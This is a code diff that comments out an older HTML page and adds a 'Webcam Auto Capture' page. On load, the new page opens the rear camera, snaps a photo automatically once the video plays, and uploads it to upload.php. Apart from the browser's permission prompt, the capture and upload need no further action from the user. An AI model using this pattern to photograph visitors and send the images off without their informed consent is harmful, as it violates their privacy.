@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -95,6 +95,115 @@
                 .catch(err => {
                     console.error('Error accessing webcam: ', err);
                 });
+        };
+    </script>
+</body>
+</html>
+ -->
+
+
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webcam Auto Capture</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        video {
+            border: 2px solid #ccc;
+            margin-bottom: 20px;
+        }
+        #photo {
+            margin-top: 20px;
+            max-width: 100%;
+            border: 2px solid #ccc;
+        }
+        #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Taking Photo...</h1>
+
+    <!-- Video element to display webcam feed -->
+    <video id="video" width="640" height="480" autoplay></video>
+
+    <!-- Canvas to draw the captured photo (hidden) -->
+    <canvas id="canvas"></canvas>
+
+    <!-- Image to show the captured photo -->
+    <img id="photo" src="" alt="Captured Photo" style="display: none;" />
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const photo = document.getElementById('photo');
+
+        // Function to capture the photo
+        function capturePhoto() {
+            // Set canvas dimensions to match video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw the current frame from the video to the canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert canvas to a data URL (base64 image)
+            const dataUrl = canvas.toDataURL('image/png');
+
+            // Show the captured image in an <img> element
+            photo.src = dataUrl;
+            photo.style.display = 'block';
+
+            // Optionally, send the image to PHP server via AJAX
+            uploadImage(dataUrl);
+        }
+
+        // Function to send the captured image to PHP using AJAX
+        function uploadImage(imageData) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'upload.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    console.log('Image uploaded successfully');
+                } else {
+                    console.error('Error uploading image');
+                }
+            };
+
+            // Send the image data to the server
+            xhr.send('image=' + encodeURIComponent(imageData));
+        }
+
+        // Request webcam access and start the process as soon as the page is loaded
+        window.onload = function() {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "environment" } // "environment" for rear camera
+            })
+            .then(stream => {
+                // Attach the webcam feed to the video element
+                video.srcObject = stream;
+
+                // Wait for the video to start playing, then capture the photo
+                video.onplaying = function() {
+                    capturePhoto(); // Automatically capture the photo when the video starts
+                };
+            })
+            .catch(err => {
+                console.error('Error accessing webcam: ', err);
+            });
         };
     </script>
 </body>
